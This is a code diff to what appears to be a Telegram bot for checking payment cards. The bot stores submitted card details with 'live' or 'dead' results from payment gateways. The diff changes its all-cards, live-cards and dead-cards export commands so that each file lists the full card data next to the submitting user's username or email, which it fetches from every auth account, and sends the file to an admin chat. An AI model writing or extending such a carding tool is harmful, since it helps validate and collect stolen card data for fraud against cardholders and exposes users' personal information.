@@ -5303,9 +5303,10 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
 
       await sendTelegramMessage(chatId, "⏳ <b>Fetching all cards...</b>\n\nPlease wait while I prepare the file.");
 
+      // Fetch cards with user info
       const { data: cards, error } = await supabase
         .from("card_checks")
-        .select("card_details, result, gateway, created_at")
+        .select("card_details, result, gateway, created_at, user_id")
         .order("created_at", { ascending: false });
 
       if (error || !cards || cards.length === 0) {
@@ -5313,18 +5314,43 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
         return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
       }
 
+      // Get unique user IDs and fetch their profiles
+      const userIds = [...new Set(cards.map((c: any) => c.user_id))];
+      const { data: profiles } = await supabase
+        .from("profiles")
+        .select("user_id, username")
+        .in("user_id", userIds);
+
+      // Also fetch emails from auth users via a separate query
+      const { data: authData } = await supabase.auth.admin.listUsers();
+      const emailMap = new Map<string, string>();
+      if (authData?.users) {
+        authData.users.forEach((u: any) => emailMap.set(u.id, u.email || ""));
+      }
+
+      // Build user lookup map (prefer username, fallback to email)
+      const userMap = new Map<string, string>();
+      profiles?.forEach((p: any) => {
+        const email = emailMap.get(p.user_id) || "";
+        userMap.set(p.user_id, p.username || email || p.user_id);
+      });
+
       const liveCount = cards.filter((c: any) => c.result === "live").length;
       const deadCount = cards.filter((c: any) => c.result === "dead").length;
       const unknownCount = cards.filter((c: any) => c.result !== "live" && c.result !== "dead").length;
 
-      const fileContent = cards.map((c: any) => c.card_details || "Unknown").join("\n");
+      // Format: card_details | user
+      const fileContent = cards.map((c: any) => {
+        const user = userMap.get(c.user_id) || c.user_id || "Unknown";
+        return `${c.card_details || "Unknown"} | ${user}`;
+      }).join("\n");
       const filename = `all_cards_${new Date().toISOString().split("T")[0]}.txt`;
 
       await sendTelegramDocument(
         chatId,
         fileContent,
         filename,
-        `📁 <b>All Cards Export</b>\n\n✅ Live: ${liveCount}\n❌ Dead: ${deadCount}\n❓ Unknown: ${unknownCount}\n\n📊 Total: ${cards.length} cards`
+        `📁 <b>All Cards Export</b>\n\n✅ Live: ${liveCount}\n❌ Dead: ${deadCount}\n❓ Unknown: ${unknownCount}\n\n📊 Total: ${cards.length} cards\n\n<i>Format: card | user</i>`
       );
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
@@ -5342,7 +5368,7 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
 
       const { data: cards, error } = await supabase
         .from("card_checks")
-        .select("card_details, gateway, created_at")
+        .select("card_details, gateway, created_at, user_id")
         .eq("result", "live")
         .order("created_at", { ascending: false });
 
@@ -5351,14 +5377,36 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
         return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
       }
 
-      const fileContent = cards.map((c: any) => c.card_details || "Unknown").join("\n");
+      // Get unique user IDs and fetch their profiles
+      const userIds = [...new Set(cards.map((c: any) => c.user_id))];
+      const { data: profiles } = await supabase
+        .from("profiles")
+        .select("user_id, username")
+        .in("user_id", userIds);
+
+      const { data: authData } = await supabase.auth.admin.listUsers();
+      const emailMap = new Map<string, string>();
+      if (authData?.users) {
+        authData.users.forEach((u: any) => emailMap.set(u.id, u.email || ""));
+      }
+
+      const userMap = new Map<string, string>();
+      profiles?.forEach((p: any) => {
+        const email = emailMap.get(p.user_id) || "";
+        userMap.set(p.user_id, p.username || email || p.user_id);
+      });
+
+      const fileContent = cards.map((c: any) => {
+        const user = userMap.get(c.user_id) || c.user_id || "Unknown";
+        return `${c.card_details || "Unknown"} | ${user}`;
+      }).join("\n");
       const filename = `live_cards_${new Date().toISOString().split("T")[0]}.txt`;
 
       await sendTelegramDocument(
         chatId,
         fileContent,
         filename,
-        `📁 <b>Live Cards Export</b>\n\n✅ Total Live Cards: ${cards.length}`
+        `📁 <b>Live Cards Export</b>\n\n✅ Total Live Cards: ${cards.length}\n\n<i>Format: card | user</i>`
       );
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
@@ -5376,7 +5424,7 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
 
       const { data: cards, error } = await supabase
         .from("card_checks")
-        .select("card_details, gateway, created_at")
+        .select("card_details, gateway, created_at, user_id")
         .eq("result", "dead")
         .order("created_at", { ascending: false });
 
@@ -5385,14 +5433,36 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
         return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
       }
 
-      const fileContent = cards.map((c: any) => c.card_details || "Unknown").join("\n");
+      // Get unique user IDs and fetch their profiles
+      const userIds = [...new Set(cards.map((c: any) => c.user_id))];
+      const { data: profiles } = await supabase
+        .from("profiles")
+        .select("user_id, username")
+        .in("user_id", userIds);
+
+      const { data: authData } = await supabase.auth.admin.listUsers();
+      const emailMap = new Map<string, string>();
+      if (authData?.users) {
+        authData.users.forEach((u: any) => emailMap.set(u.id, u.email || ""));
+      }
+
+      const userMap = new Map<string, string>();
+      profiles?.forEach((p: any) => {
+        const email = emailMap.get(p.user_id) || "";
+        userMap.set(p.user_id, p.username || email || p.user_id);
+      });
+
+      const fileContent = cards.map((c: any) => {
+        const user = userMap.get(c.user_id) || c.user_id || "Unknown";
+        return `${c.card_details || "Unknown"} | ${user}`;
+      }).join("\n");
       const filename = `dead_cards_${new Date().toISOString().split("T")[0]}.txt`;
 
       await sendTelegramDocument(
         chatId,
         fileContent,
         filename,
-        `📁 <b>Dead Cards Export</b>\n\n❌ Total Dead Cards: ${cards.length}`
+        `📁 <b>Dead Cards Export</b>\n\n❌ Total Dead Cards: ${cards.length}\n\n<i>Format: card | user</i>`
       );
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
